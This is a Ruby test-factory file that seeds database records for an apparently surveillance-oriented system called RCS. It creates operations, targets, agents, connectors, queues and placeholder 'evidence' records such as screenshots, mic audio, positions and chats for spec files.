module RCS
  module Factory
    module Helpers
      @@list ||= {}

      def factory_define(name, &block)
        @@list[name] = RCS::Factory::Definition.new(name, &block)
      end

      def factory_create(name, params = {})
        factory = @@list[name] || raise("Unable to find factory #{name}")
        factory.run(params)
      end
    end

    class Definition
      include Helpers

      def initialize(name, &block)
        @name = name
        @block = block
      end

      def run(params)
        # puts "Factory: creating #{@name} with params: #{params.inspect}"
        instance_exec(params, &@block)
      end
    end
  end
end


# Helpers (to be used in the spec files)

include RCS::Factory::Helpers


# Definitions

factory_define :user do |params|
  attributes = {name: "testuser_#{rand(1E10)}", enabled: true, cookie: "cookie_#{rand(1E20)}"}
  attributes.merge!(params)

  ::User.create!(attributes)
end

factory_define :session do |params|
  raise("User must be supplied") unless params[:user]

  Session.create!(params)
end

factory_define :group do |params|
  users = params.delete(:users)
  items = params.delete(:items)

  group = Group.new name: "testgroup_#{rand(1E10)}", alert: 'NO'

  group.users = users if users
  group.items = items if items

  group.save!
  group
end

factory_define :operation do |params|
  attributes = {name: 'test-operation', _kind: 'operation', path: [], stat: ::Stat.new}
  attributes.deep_merge! params

  operation = ::Item.create! attributes
  operation.users << factory_create(:user)
  operation
end

factory_define :target do |params|
  operation = params.delete(:operation) || factory_create(:operation)
  attributes = {name: "test-target", _kind: 'target', path: [operation._id], stat: ::Stat.new}
  attributes.deep_merge! params
  ::Item.create! attributes
end

factory_define :entity_handle do |params|
  entity = params.delete(:entity) || raise("An Entity must be supplied")
  entity.create_or_update_handle(params[:type], params[:handle], params[:name])
end

factory_define :target_entity do |params|
  target = params.delete(:target) || factory_create(:target)
  ::Entity.where(type: :target, path: target._id).first
end

factory_define :person_entity do |params|
  operation = params.delete(:operation) || factory_create(:operation)
  attributes = {name: 'Steve Ballmer', level: :automatic}
  attributes.deep_merge! params
  attributes.deep_merge! type: :person, path: [operation._id]
  ::Entity.create! attributes
end

factory_define :ghost_entity do |params|
  factory_create(:person_entity, params.merge(level: :ghost))
end

factory_define :aggregate do |params|
  target = params.delete :target
  attributes = {day: Time.now.strftime('%Y%m%d'), aid: 'agent_id'}
  attributes.deep_merge! params
  ::Aggregate.target(target).create! attributes
end

factory_define :agent do |params|
  target = params.delete(:target) || factory_create(:target)
  attributes = {name: 'test-agent', _kind: 'agent', path: target.path+[target.id], stat: ::Stat.new}
  attributes.deep_merge! params
  ::Item.create! attributes
end

factory_define :file do |params|
  target = params.delete(:target) || raise("A target must be supplied")

  file_content = params.delete(:content) || raise("File content must be supplied")
  file_content = File.read(file_content) if File.exists?(file_content)
  file_name = params.delete(:name) || "file_#{rand(1E20)}"

  id = RCS::DB::GridFS.put(file_content, {filename: file_name}, target._id.to_s)
  {'_grid' => id, '_grid_size' => file_content.size}
end

factory_define :connector do |params|
  if params.keys.include?(:path)
    path = params[:path]
  else
    item = params.delete(:item) || raise("An item (like operation, target, agent, etc.) must be supplied")
    path = item.path + [item._id]
  end

  dest = RCS::DB::Config.instance.temp
  raise("Cannot find folder #{dest}") unless Dir.exists?(dest)

  attributes = {enabled: true, name: "connector_#{rand(1E10)}", dest: dest, path: path, raw: false}
  attributes.deep_merge! params

  ::Connector.create! attributes
end


# Evidence factories

factory_define :evidence do |params|
  unless params[:agent] or params[:target]
    raise "An agent or a target must be supplied"
  end

  target = params.delete(:target)
  unless target
    target = params[:agent] ? ::Item.find(params[:agent].path.last) : factory_create(:target)
  end

  agent = params.delete(:agent) || factory_create(:agent, target: target)

  if agent.path.last != target.id
    raise "The given agent does not belong to the given target"
  end

  attributes = {dr: Time.now.to_i, da: Time.now.to_i, aid: agent._id, data: {}}
  attributes.deep_merge! params
  ::Evidence.collection_class(target._id).create! attributes
end

factory_define :screenshot_evidence do |params|
  target = params[:target] || raise("A target must be supplied")

  file_content = params.delete(:content) || fixtures_path('image.001.jpg')
  file_data = factory_create(:file, target: target, content: file_content)

  attributes = {type: 'screenshot', target: target, data: file_data}
  attributes.deep_merge! params

  factory_create(:evidence, attributes)
end

factory_define :mic_evidence do |params|
  target = params[:target] || raise("A target must be supplied")

  file_content = params.delete(:content) || fixtures_path('audio.001.mp3')
  file_data = factory_create(:file, target: target, content: file_content)

  data = {mic_id: "MIC#{rand(1E20)}"}.deep_merge(file_data)
  attributes = {type: 'mic', target: target, data: data}
  attributes.deep_merge! params

  factory_create(:evidence, attributes)
end

factory_define :position_evidence do |params|
  lat, lon, acc = params[:latitude], params[:longitude], params[:accuracy]

  if (!lat and lon) or (lon and !lat)
    raise "Latitude and longitude must be both specified"
  end

  lat ||= 45.4766561
  lon ||= 9.1915256
  acc ||= 25

  data = {type: 'WIFI', latitude: lat, longitude: lon, accuracy: acc}
  attributes = {type: 'position', data: data}
  attributes.deep_merge! params
  attributes[:data][:position] = [attributes[:data][:longitude], attributes[:data][:latitude]]

  evidence = factory_create(:evidence, attributes)
  evidence.class.create_indexes
  evidence
end

factory_define :chat_evidence do |params|
  data = {'from' => 'test-sender', 'rcpt' => 'test-receiver', 'incoming' => 1, 'program' => 'skype', 'content' => 'all your base are belong to us'}
  params[:data].stringify_keys! if params[:data]
  attributes = {data: data}
  attributes.deep_merge! params
  attributes.merge! type: 'chat'

  evidence = factory_create(:evidence, attributes)
  if evidence.kw.blank?
    evidence.update_attributes kw: Indexer.keywordize(evidence.type, evidence.data, evidence.note)
  end
  evidence
end

factory_define :addressbook_evidence do |params|
  data = {'handle' => 'j.snow', 'program' => :skype, 'name' => 'John Snow'}
  params[:data].stringify_keys! if params[:data]
  attributes = {data: data}
  attributes.deep_merge! params
  attributes.merge! type: 'addressbook'

  factory_create(:evidence, attributes)
end


# Queue

factory_define :connector_queue do |params|
  target = params.delete(:target) || factory_create(:target)
  evidence = params.delete(:evidence) || factory_create(:chat_evidence, target: target)

  connectors = []
  connectors << params.delete(:connector)
  connectors.concat(params.delete(:connectors) || [])
  connectors.compact!
  connectors << factory_create(:connector, item: target) if connectors.empty?

  ConnectorQueue.add target, evidence, connectors
end

factory_define :watched_item do |params|
  WatchedItem.create!(params)
end

factory_define :push_queue do |params|
  PushQueue.create!(params)
end
